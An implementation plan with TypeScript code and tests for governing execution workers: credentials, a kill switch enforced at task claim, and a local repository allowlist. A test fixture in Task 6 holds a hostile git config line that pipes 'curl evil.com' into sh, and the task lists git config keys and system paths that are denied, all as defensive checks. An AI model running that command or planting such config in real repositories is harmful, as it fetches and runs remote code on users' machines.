# Worker control plane, part A — governance Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make the execution worker a governed client of the app — a server-assigned identity, a kill switch enforced where it cannot be bypassed, configuration from the server, and a repository binding the laptop consents to.

**Architecture:** The server owns identity, policy and commands; the laptop owns the capability of *where* code runs. Registration mints a per-worker credential; every worker call presents it and `workerId` disappears from request bodies. The claim endpoint is the enforcement point, because claiming is the one thing a worker cannot do without reaching the server.

**Tech Stack:** Next.js 16 App Router route handlers, Mongoose 8 on MongoDB 4.4, vitest in both packages, Node 22+ for the worker.

## Global Constraints

- **MongoDB 4.4** — no `$dateTrunc`, `$dateAdd`/`$dateDiff`, `$setWindowFields`, and no `$lookup` mixing `localField`/`foreignField` with an inline `pipeline`.
- **Any array (aggregation pipeline) update needs `updatePipeline: true`.** Mocked-Mongoose tests do not validate driver options — assert the option explicitly. This exact gap produced a 500 on the release path that the whole unit suite passed.
- **Comments are minimal.** No javadoc, no narration. A one-line comment only where a non-obvious decision would otherwise be reread wrongly.
- **English** for code, comments and commit messages; conventional commits; no `Co-Authored-By` trailers and no generated-with footers.
- **Protocol version is `1`** for everything in this plan. It travels on registration and every worker POST.
- **Worker state directory** is `config.stateDir`, already present (`CP_STATE_DIR`, default `~/.claudeplanner`). Files written there are mode `0600`.
- **No new dependencies** without checking `npm ls <name>` first — bcryptjs, mongoose and vitest are already present.

---

## File Structure

**Server**

| File | Responsibility |
|---|---|
| `src/models/worker.ts` | The `Worker` schema: identity, credential hash, assignments, governance flags |
| `src/lib/worker-service.ts` | Registration, credential verification, the governance verdict, heartbeat |
| `src/lib/middleware.ts` (modify) | `withWorker` — resolves a worker credential to a `Worker` document |
| `src/app/api/workers/register/route.ts` | Mint an identity |
| `src/app/api/workers/[workerId]/heartbeat/route.ts` | Liveness, and the abort verdict |
| `src/app/api/workers/[workerId]/route.ts` | Read and edit worker configuration, authorised by blast radius |
| `src/app/api/admin/workers/route.ts` | Fleet listing |
| `src/app/api/projects/[projectId]/tasks/claim/route.ts` (modify) | Enforce the verdict before claiming |
| `src/lib/task-service.ts` (modify) | `claimNextTask` takes a worker document, not a string |
| `src/app/admin/workers/page.tsx` | The fleet console |

**Worker**

| File | Responsibility |
|---|---|
| `worker/src/registration.ts` | Register, persist the credential, heartbeat, surface the abort verdict |
| `worker/src/repos.ts` | The local allowlist and every refusal rule for a proposed path |
| `worker/src/control.ts` | SSE client: commands, config, `wake`, reconnect, degradation |
| `worker/src/config.ts` (modify) | Env demoted to bootstrap; effective config arrives from the server |
| `worker/src/exec.ts` (modify) | `AbortSignal` and `stdin` on `RunOpts` |
| `worker/src/pipeline.ts` (modify) | Abort checks between phases |
| `worker/src/loop.ts` (modify) | Pause state; stop implies pause |

---

### Task 1: The `Worker` model

**Files:**
- Create: `src/models/worker.ts`
- Modify: `src/types/index.ts` (add `IWorker`, `WorkerAssignment`)
- Test: `src/lib/worker-service.test.ts` (created in Task 2; this task has no behaviour of its own to test beyond the schema compiling)

**Interfaces:**
- Produces: `Worker` (Mongoose model), `IWorker`, `WorkerAssignment`

- [ ] **Step 1: Add the shared types**

In `src/types/index.ts`:

```ts
export interface WorkerAssignment {
  project: string;
  proposedPath: string;
}

export interface IWorker {
  _id: string;
  name: string;
  host: string;
  platform: string;
  version: string;
  protocolVersion: number;
  credentialHash: string;
  assignments: WorkerAssignment[];
  enabled: boolean;
  lockedByInstance: boolean;
  lastSeenAt: Date | null;
  command: "" | "pause" | "resume" | "stop";
  commandIssuedAt: Date | null;
  commandAckedAt: Date | null;
  createdAt: Date;
  updatedAt: Date;
}
```

- [ ] **Step 2: Create the model**

`src/models/worker.ts`:

```ts
import mongoose, { Schema, Model } from "mongoose";
import { IWorker } from "@/types";

const workerSchema = new Schema<IWorker>(
  {
    name: { type: String, required: true, trim: true },
    host: { type: String, default: "" },
    platform: { type: String, default: "" },
    version: { type: String, default: "" },
    protocolVersion: { type: Number, required: true },
    credentialHash: { type: String, required: true },
    assignments: {
      type: [{ project: { type: Schema.Types.ObjectId, ref: "Project" }, proposedPath: String }],
      default: [],
    },
    enabled: { type: Boolean, default: true },
    lockedByInstance: { type: Boolean, default: false },
    lastSeenAt: { type: Date, default: null },
    command: { type: String, enum: ["", "pause", "resume", "stop"], default: "" },
    commandIssuedAt: { type: Date, default: null },
    commandAckedAt: { type: Date, default: null },
  },
  { timestamps: true }
);

workerSchema.index({ "assignments.project": 1 });

export const Worker: Model<IWorker> =
  mongoose.models.Worker || mongoose.model<IWorker>("Worker", workerSchema);
```

- [ ] **Step 3: Verify it compiles**

Run: `npm run build`
Expected: succeeds.

- [ ] **Step 4: Commit**

```bash
git add src/models/worker.ts src/types/index.ts
git commit -m "feat(workers): worker identity model (CP-161)"
```

---

### Task 2: Registration and the governance verdict

The verdict is the heart of this plan. It is one pure function so every route that governs a worker asks the same question and cannot answer it differently.

**Files:**
- Create: `src/lib/worker-service.ts`, `src/lib/worker-service.test.ts`

**Interfaces:**
- Consumes: `Worker` (Task 1)
- Produces:
  - `PROTOCOL_VERSION: number`
  - `WORKER_STALE_MS: number`
  - `registerWorker(input): Promise<{ worker: IWorker; credential: string }>`
  - `verdictFor(worker, projectId, now?): { ok: true } | { ok: false; reason: string }`
  - `verifyWorkerCredential(workerId, credential): Promise<IWorker | null>`
  - `touchWorker(workerId): Promise<void>`

- [ ] **Step 1: Write the failing test**

`src/lib/worker-service.test.ts`:

```ts
import { describe, it, expect, vi, beforeEach } from "vitest";

const findById = vi.fn();
const findOneAndUpdate = vi.fn();
const create = vi.fn();
const updateOne = vi.fn();

vi.mock("./db", () => ({ connectDB: vi.fn() }));
vi.mock("@/models/worker", () => ({ Worker: { findById, findOneAndUpdate, create, updateOne } }));

const { verdictFor, PROTOCOL_VERSION, WORKER_STALE_MS } = await import("./worker-service");

const now = new Date("2026-08-01T12:00:00.000Z");
const fresh = new Date(now.getTime() - 1000);

function worker(overrides: Record<string, unknown> = {}) {
  return {
    _id: "w1",
    enabled: true,
    lockedByInstance: false,
    protocolVersion: PROTOCOL_VERSION,
    lastSeenAt: fresh,
    assignments: [{ project: "p1", proposedPath: "/repo" }],
    ...overrides,
  } as never;
}

describe("verdictFor", () => {
  it("admits a healthy worker assigned to the project", () => {
    expect(verdictFor(worker(), "p1", now)).toEqual({ ok: true });
  });

  it.each([
    ["disabled", { enabled: false }, /disabled/i],
    ["locked by the instance", { lockedByInstance: true }, /locked/i],
    ["not assigned to the project", { assignments: [] }, /assign/i],
    ["speaking an older protocol", { protocolVersion: PROTOCOL_VERSION - 1 }, /protocol/i],
  ])("refuses a worker %s", (_label, overrides, pattern) => {
    const verdict = verdictFor(worker(overrides), "p1", now);

    expect(verdict.ok).toBe(false);
    expect((verdict as { reason: string }).reason).toMatch(pattern);
  });

  // A worker that stopped heartbeating may be a crashed process whose task is still claimed,
  // or a machine deliberately cut off — neither should keep taking work
  it("refuses a worker that has stopped heartbeating", () => {
    const stale = new Date(now.getTime() - WORKER_STALE_MS - 1);

    expect(verdictFor(worker({ lastSeenAt: stale }), "p1", now).ok).toBe(false);
  });

  it("refuses a worker that has never heartbeaten", () => {
    expect(verdictFor(worker({ lastSeenAt: null }), "p1", now).ok).toBe(false);
  });

  it("refuses when the project is not among several assignments", () => {
    const many = worker({
      assignments: [
        { project: "p2", proposedPath: "/a" },
        { project: "p3", proposedPath: "/b" },
      ],
    });

    expect(verdictFor(many, "p1", now).ok).toBe(false);
  });
});
```

- [ ] **Step 2: Run to verify it fails**

Run: `npx vitest run src/lib/worker-service.test.ts`
Expected: FAIL — cannot resolve `./worker-service`.

- [ ] **Step 3: Implement**

`src/lib/worker-service.ts`:

```ts
import crypto from "crypto";
import bcrypt from "bcryptjs";
import { connectDB } from "./db";
import { Worker } from "@/models/worker";
import { IWorker } from "@/types";

export const PROTOCOL_VERSION = 1;
export const WORKER_STALE_MS = 5 * 60 * 1000;

export type Verdict = { ok: true } | { ok: false; reason: string };

export function verdictFor(worker: IWorker, projectId: string, now = new Date()): Verdict {
  if (!worker.enabled) return { ok: false, reason: "this worker is disabled" };
  if (worker.lockedByInstance) return { ok: false, reason: "this worker is locked by the instance" };
  if (worker.protocolVersion !== PROTOCOL_VERSION) {
    return {
      ok: false,
      reason: `this worker speaks protocol ${worker.protocolVersion}; the server speaks ${PROTOCOL_VERSION}`,
    };
  }
  const seen = worker.lastSeenAt ? new Date(worker.lastSeenAt).getTime() : 0;
  if (now.getTime() - seen > WORKER_STALE_MS) {
    return { ok: false, reason: "this worker has not reported in" };
  }
  const assigned = (worker.assignments ?? []).some((a) => String(a.project) === String(projectId));
  if (!assigned) return { ok: false, reason: "this worker has no assignment for this project" };
  return { ok: true };
}

export async function registerWorker(input: {
  name: string;
  host: string;
  platform: string;
  version: string;
  protocolVersion: number;
}): Promise<{ worker: IWorker; credential: string }> {
  await connectDB();
  const credential = `cpw_${crypto.randomBytes(32).toString("hex")}`;
  const worker = await Worker.create({
    ...input,
    credentialHash: await bcrypt.hash(credential, 10),
    lastSeenAt: new Date(),
  });
  return { worker, credential };
}

export async function verifyWorkerCredential(
  workerId: string,
  credential: string
): Promise<IWorker | null> {
  await connectDB();
  const worker = await Worker.findById(workerId);
  if (!worker) return null;
  return (await bcrypt.compare(credential, worker.credentialHash)) ? worker : null;
}

export async function touchWorker(workerId: string): Promise<void> {
  await connectDB();
  await Worker.updateOne({ _id: workerId }, { $set: { lastSeenAt: new Date() } });
}
```

- [ ] **Step 4: Run to verify it passes**

Run: `npx vitest run src/lib/worker-service.test.ts`
Expected: 9 passing.

- [ ] **Step 5: Commit**

```bash
git add src/lib/worker-service.ts src/lib/worker-service.test.ts
git commit -m "feat(workers): registration and the governance verdict (CP-161)"
```

---

### Task 3: `withWorker` middleware and the registration route

**Files:**
- Modify: `src/lib/middleware.ts`
- Create: `src/app/api/workers/register/route.ts`, `src/app/api/workers/[workerId]/heartbeat/route.ts`

**Interfaces:**
- Consumes: `registerWorker`, `verifyWorkerCredential`, `touchWorker`, `verdictFor`, `PROTOCOL_VERSION` (Task 2)
- Produces: `withWorker(handler)` — a route wrapper that resolves `Authorization: Bearer <credential>` plus an `X-Worker-Id` header to a worker document and passes it as `{ worker }`

- [ ] **Step 1: Add the middleware**

In `src/lib/middleware.ts`, following the shape of the existing wrappers:

```ts
export function withWorker(
  handler: (request: NextRequest, context: { params: Params; worker: IWorker }) => Promise<Response>
) {
  return async (request: NextRequest, context: { params: Params }) => {
    const header = request.headers.get("authorization") ?? "";
    const workerId = request.headers.get("x-worker-id") ?? "";
    if (!header.startsWith("Bearer ") || !workerId) {
      return NextResponse.json({ error: "Worker credential required" }, { status: 401 });
    }
    const worker = await verifyWorkerCredential(workerId, header.slice("Bearer ".length));
    if (!worker) {
      return NextResponse.json({ error: "Worker credential rejected" }, { status: 401 });
    }
    return handler(request, { ...context, worker });
  };
}
```

- [ ] **Step 2: Registration route**

`src/app/api/workers/register/route.ts` — authorised by an ordinary API token (`withAuth`), because a worker has no identity yet:

```ts
export const POST = withAuth(async (request) => {
  await connectDB();
  const body = await request.json().catch(() => ({}));
  const name = typeof body.name === "string" ? body.name.trim() : "";
  if (!name) return NextResponse.json({ error: "name is required" }, { status: 400 });
  if (body.protocolVersion !== PROTOCOL_VERSION) {
    return NextResponse.json(
      { error: `server speaks protocol ${PROTOCOL_VERSION}` },
      { status: 409 }
    );
  }

  const { worker, credential } = await registerWorker({
    name,
    host: String(body.host ?? ""),
    platform: String(body.platform ?? ""),
    version: String(body.version ?? ""),
    protocolVersion: PROTOCOL_VERSION,
  });

  return NextResponse.json({ workerId: String(worker._id), credential });
});
```

- [ ] **Step 3: Heartbeat route**

`src/app/api/workers/[workerId]/heartbeat/route.ts`:

```ts
export const POST = withWorker(async (_request, { worker }) => {
  if (!worker.enabled || worker.lockedByInstance) {
    return NextResponse.json({ error: "this worker may not run", abort: true }, { status: 403 });
  }
  await touchWorker(String(worker._id));
  return NextResponse.json({ command: worker.command, ok: true });
});
```

- [ ] **Step 4: Verify the build**

Run: `npm run build`
Expected: succeeds.

- [ ] **Step 5: Commit**

```bash
git add src/lib/middleware.ts src/app/api/workers
git commit -m "feat(workers): credential middleware, registration and heartbeat (CP-161)"
```

---

### Task 4: Enforce the verdict at the claim

This is the task the whole design rests on. Until it lands, every governance flag is decorative.

**Files:**
- Modify: `src/app/api/projects/[projectId]/tasks/claim/route.ts`, `src/lib/task-service.ts`, `src/lib/task-service.test.ts`

**Interfaces:**
- Consumes: `withWorker` (Task 3), `verdictFor` (Task 2)
- Produces: `claimNextTask(projectId, workerId, runId)` unchanged in signature — the *route* now supplies a `workerId` it derived from a credential rather than one the caller asserted

- [ ] **Step 1: Write the failing test**

Append to `src/lib/task-service.test.ts`:

```ts
describe("claimNextTask identity", () => {
  beforeEach(() => {
    findOneAndUpdate.mockReset();
    findById.mockReset();
    findById.mockReturnValue({ lean: () => Promise.resolve(customBoard) });
    findOneAndUpdate.mockResolvedValue({ _id: "t1", taskNumber: 1 });
  });

  // The worker id must be the one the server derived from a credential, never a request body
  // field: a label anyone can change is not something a kill switch can key on
  it("stamps exactly the worker id it was given", async () => {
    await claimNextTask("p1", "server-derived-id", "run-1");

    expect(findOneAndUpdate.mock.calls[0][1].$set["execution.workerId"]).toBe("server-derived-id");
  });
});
```

- [ ] **Step 2: Run to verify it passes already**

Run: `npx vitest run src/lib/task-service.test.ts`
Expected: PASS — this documents the contract the route must honour; the behaviour change is in the route.

- [ ] **Step 3: Rewrite the claim route**

`src/app/api/projects/[projectId]/tasks/claim/route.ts`:

```ts
import { NextResponse } from "next/server";
import { connectDB } from "@/lib/db";
import { withWorker } from "@/lib/middleware";
import { claimNextTask, releaseExpiredTasks } from "@/lib/task-service";
import { verdictFor } from "@/lib/worker-service";

export const POST = withWorker(async (request, { params, worker }) => {
  const { projectId } = await params;
  await connectDB();

  const verdict = verdictFor(worker, projectId);
  if (!verdict.ok) {
    return NextResponse.json({ error: verdict.reason }, { status: 403 });
  }

  const { runId } = await request.json().catch(() => ({}));
  if (typeof runId !== "string" || !runId.trim()) {
    return NextResponse.json({ error: "runId is required" }, { status: 400 });
  }

  await releaseExpiredTasks(projectId).catch(() => 0);

  const task = await claimNextTask(projectId, String(worker._id), runId);
  if (!task) return new NextResponse(null, { status: 204 });

  return NextResponse.json(task);
});
```

`workerId` is gone from the body. `withWorker` replaces `withProjectAccess`, and the project check now lives in the verdict — a worker is authorised by assignment, not by the token owner's project membership.

- [ ] **Step 4: Run the suite and build**

Run: `npx vitest run && npm run build`
Expected: all pass.

- [ ] **Step 5: Commit**

```bash
git add src/app/api/projects/\[projectId\]/tasks/claim/route.ts src/lib/task-service.test.ts
git commit -m "fix(workers): enforce the instance lock where it cannot be bypassed (CP-161)"
```

---

### Task 5: Worker configuration endpoints, authorised by blast radius

**Files:**
- Create: `src/app/api/workers/[workerId]/route.ts`, `src/app/api/admin/workers/route.ts`

**Interfaces:**
- Consumes: `Worker` (Task 1)
- Produces: `GET`/`PATCH /api/workers/:workerId`, `GET /api/admin/workers`

- [ ] **Step 1: Write the route**

Follow `src/app/api/admin/agents/[projectId]/route.ts` — field-by-field validation with an explicit switch, never `$set` from a request-shaped object, and `logProjectAudit` on every change. Fields that change *what executes* (`assignments`, `enabled`, `lockedByInstance`, gate list, base branch) require `withAdmin`. Fields that change *how well it reviews* (diff thresholds, model, poll interval) accept `withProjectAdmin`, which already refuses `tokenScoped` users.

The executing path is **not** settable to a live value here: `assignments[].proposedPath` is a proposal, and the worker's local allowlist decides whether it is ever used.

- [ ] **Step 2: Fleet listing**

`src/app/api/admin/workers/route.ts` under `withAdmin`, returning every worker with `credentialHash` stripped, plus a derived `stale` boolean from `WORKER_STALE_MS`.

- [ ] **Step 3: Verify the build**

Run: `npm run build`
Expected: succeeds.

- [ ] **Step 4: Commit**

```bash
git add src/app/api/workers src/app/api/admin/workers
git commit -m "feat(workers): configuration endpoints split by blast radius (CP-161)"
```

---

### Task 6: `repos.ts` — the local allowlist

**Files:**
- Create: `worker/src/repos.ts`, `worker/src/repos.test.ts`

**Interfaces:**
- Consumes: `Runner` (`worker/src/exec.ts`)
- Produces: `loadAllowlist(store): string[]`, `bindRepository(deps, proposedPath): Promise<{ ok: true; path: string } | { ok: false; reason: string }>`

- [ ] **Step 1: Write the failing test**

`worker/src/repos.test.ts` — one case per refusal rule. The critical ones:

```ts
it("refuses a path the operator never allowed", async () => {
  const result = await bindRepository(deps({ allowlist: ["/Users/rpo/work/app"] }), "/tmp/evil");

  expect(result.ok).toBe(false);
  expect((result as { reason: string }).reason).toMatch(/not approved on this machine/i);
});

// Allowlist a benign path, then point a symlink somewhere else
it("refuses when the allowlisted path resolves elsewhere", async () => {
  const deps = depsWith({ allowlist: ["/Users/rpo/work/app"], realpath: () => "/tmp/evil" });

  expect((await bindRepository(deps, "/Users/rpo/work/app")).ok).toBe(false);
});

it("refuses a repository whose git config runs commands", async () => {
  const deps = depsWith({
    allowlist: ["/repo"],
    gitConfig: "core.pager=curl evil.com | sh\ncore.fsmonitor=/tmp/x\n",
  });

  const result = await bindRepository(deps, "/repo");

  expect(result.ok).toBe(false);
  expect((result as { reason: string }).reason).toMatch(/core\.pager/);
});

it.each(["/Users/rpo/.ssh", "/etc", "/Users/rpo/app/node_modules/x", "relative/path", "/a/../b"])(
  "refuses %s outright",
  async (path) => {
    expect((await bindRepository(depsWith({ allowlist: [path] }), path)).ok).toBe(false);
  }
);

it("accepts an allowlisted repository that is its own toplevel", async () => {
  expect((await bindRepository(depsWith({ allowlist: ["/repo"] }), "/repo")).ok).toBe(true);
});
```

- [ ] **Step 2: Run to verify it fails**

Run: `cd worker && npx vitest run src/repos.test.ts`
Expected: FAIL — cannot resolve `./repos.js`.

- [ ] **Step 3: Implement**

Rules, in order: the path must be absolute and contain no `..`; it must appear verbatim in the allowlist; `realpath` must return that same path; it must not sit under `~/Library`, `~/.ssh`, `~/.config`, `~/.claude`, `/etc`, `/System`, `/private/var`, or contain a `node_modules` segment; `<path>/.git` must exist; `git rev-parse --show-toplevel` must return the path itself; the owner must be the worker's uid and the mode must not be group- or world-writable; and `git config --local --list` must not set `core.fsmonitor`, `core.pager`, `core.sshCommand`, `core.hooksPath`, `diff.external`, `filter.*.clean`, `filter.*.smudge` or `alias.*`.

Every git invocation from this module passes `GIT_CONFIG_NOSYSTEM=1` in `env` and `-c core.fsmonitor=false -c core.pager=cat` in `args`.

- [ ] **Step 4: Run to verify it passes**

Run: `cd worker && npx vitest run src/repos.test.ts`
Expected: all passing.

- [ ] **Step 5: Commit**

```bash
git add worker/src/repos.ts worker/src/repos.test.ts
git commit -m "feat(worker): a repository path is a locally consented capability (CP-161)"
```

---

### Task 7: `registration.ts` — identity on the worker side

**Files:**
- Create: `worker/src/registration.ts`, `worker/src/registration.test.ts`
- Modify: `worker/src/api.ts` (send `X-Worker-Id` and the worker credential once registered)

**Interfaces:**
- Produces: `ensureRegistered(deps): Promise<{ workerId: string; credential: string }>`, `startHeartbeat(deps): { stop(): void; onAbort(cb): void }`

- [ ] **Step 1: Write the failing test**

Cover: a first run registers and persists the credential at mode `0600`; a second run reuses the stored credential and does not register again; a `403` from heartbeat fires `onAbort`; a network failure on heartbeat does **not** fire `onAbort` (a blip is not a kill switch).

- [ ] **Step 2–4: Implement, run, commit**

The credential is stored in `<stateDir>/worker.json`. Registration happens only when that file is absent or its credential is rejected with 401.

```bash
git commit -m "feat(worker): server-assigned identity and heartbeat (CP-161)"
```

---

### Task 8: `AbortSignal` — make stop able to stop

**Files:**
- Modify: `worker/src/exec.ts`, `worker/src/pipeline.ts`, `worker/src/delivery.ts`, `worker/src/gates/*.ts` and their tests

**Interfaces:**
- Produces: `RunOpts.signal?: AbortSignal`, `RunOpts.stdin?: string`, `PipelineDeps.signal?: AbortSignal`

- [ ] **Step 1: Write the failing test**

```ts
it("kills a running command when the signal aborts", async () => {
  const controller = new AbortController();
  const running = createRunner().run(process.execPath, ["-e", "setInterval(() => {}, 1000)"], {
    cwd: process.cwd(),
    timeoutMs: 60_000,
    signal: controller.signal,
  });

  controller.abort();

  const result = await running;
  expect(result.code).not.toBe(0);
});

it("stops between phases without starting the next gate", async () => {
  const controller = new AbortController();
  const later = { name: "build", run: vi.fn() };
  const first = { name: "diff-size", run: vi.fn(async () => { controller.abort(); return { ok: true, reason: "" }; }) };
  const h = harness({ gates: [first, later], signal: controller.signal });

  await runTask(h.deps, task);

  expect(later.run).not.toHaveBeenCalled();
});
```

- [ ] **Step 2–4: Implement, run, commit**

`spawn` accepts `signal` directly. `pipeline.ts` checks `signal?.aborted` before each gate and before delivery, reporting a requeue **with the attempt refunded** when it stops.

```bash
git commit -m "feat(worker): cancellable runs (CP-161)"
```

---

### Task 9: Pause, and stop implying pause

**Files:**
- Modify: `worker/src/loop.ts`, `worker/src/loop.test.ts`

**Interfaces:**
- Produces: `Loop.pause()`, `Loop.resume()`, `Loop.paused(): boolean`

- [ ] **Step 1: Write the failing test**

```ts
// Without this, stop refunds the attempt, the loop continues without sleeping, and claim hands
// back the same task — a restart, not a stop
it("does not claim again after a stop", async () => {
  const api = apiStub(queue(task, { ...task, taskId: "t2" }));
  const { loop, execute } = loopOver(api, {
    execute: async () => { loop.pause(); },
  });

  await loop.start();

  expect(execute).toHaveBeenCalledTimes(1);
});

it("keeps sleeping while paused, and claims nothing", async () => {
  const api = apiStub(queue(task));
  const { loop } = loopOver(api, { sleep: async () => loop.stop() });
  loop.pause();

  await loop.start();

  expect(api.claim).not.toHaveBeenCalled();
});
```

- [ ] **Step 2–4: Implement, run, commit**

```bash
git commit -m "feat(worker): pause, and stop that stays stopped (CP-161)"
```

---

### Task 10: `control.ts` — the SSE command channel

**Files:**
- Create: `worker/src/control.ts`, `worker/src/control.test.ts`
- Create: `src/app/api/workers/[workerId]/stream/route.ts`

**Interfaces:**
- Produces: `connectControl(deps): { close(): void }` — dispatches `command`, `config` and `wake`

- [ ] **Step 1: Write the failing test**

Driven by a synthetic `ReadableStream`, never a network. Cover: a `command` frame calls the matching handler; a malformed frame is skipped rather than throwing; the stream ending schedules a reconnect with backoff; `: ping` comments are ignored.

- [ ] **Step 2–4: Implement, run, commit**

The server route mirrors `pm/chat/route.ts`, including `: ping` every 15 seconds — without it a proxy cuts an idle stream silently and the degradation to polling goes unnoticed.

```bash
git commit -m "feat(worker): server-pushed commands over SSE (CP-161)"
```

---

### Task 11: Configuration from the server

**Files:**
- Modify: `worker/src/config.ts`, `worker/src/config.test.ts`, `worker/src/main.ts`

**Interfaces:**
- Produces: `loadBootstrap(env, readSecret)` (API URL, credentials, state dir, worker name) and `EffectiveConfig` assembled from the registration response and later `config` frames

- [ ] **Step 1: Write the failing test**

Cover: bootstrap requires only the URL and a credential; `CP_REPO_PATH` and `CP_PROJECT_ID` are no longer required; a `config` frame replaces policy without a restart; and an unknown field in a `config` frame is ignored rather than adopted.

- [ ] **Step 2–4: Implement, run, commit**

```bash
git commit -m "feat(worker): policy from the server, env down to bootstrap (CP-161)"
```

---

### Task 12: `/admin/workers`

**Files:**
- Create: `src/app/admin/workers/page.tsx`

**Interfaces:**
- Consumes: `GET /api/admin/workers`, `PATCH /api/workers/:id` (Task 5)

- [ ] **Step 1: Build the page**

Follow `src/app/admin/agents/page.tsx` exactly — same table shape, same save affordance, same instance-defaults block. Columns: name, host, version, last seen (with a stale badge), current task and phase, enabled toggle, instance lock.

A command in flight renders as "Pausing…" until `commandAckedAt` catches up, with "not acknowledged for Xs" once that exceeds a minute. The console must not claim a worker is paused while it is still merging.

- [ ] **Step 2: Verify live**

Run the app locally against a seeded worker, toggle the lock, and confirm with `curl` that the claim endpoint then returns 403.

- [ ] **Step 3: Commit**

```bash
git add src/app/admin/workers
git commit -m "feat(admin): worker fleet console (CP-161)"
```

---

## Verification for part A

The plan is done when, on the CP-158 local rig:

1. A fresh worker registers, appears in `/admin/workers`, and claims a task.
2. Toggling the instance lock makes the next claim return 403 — **with SSE disconnected**, proving the enforcement is not on the push channel.
3. A worker whose heartbeat stops is refused within `WORKER_STALE_MS`.
4. Pointing an assignment at a path outside the local allowlist leaves the worker refusing to run, with the reason visible, and does not create a worktree.
5. A repository carrying `core.pager` in its git config is refused before any command runs in it.
6. Stop during a build aborts within seconds and does not reclaim the same task.

Parts B (telemetry and the live view) and C (the menubar app) get their own plans, each written after the part before it has been reviewed.
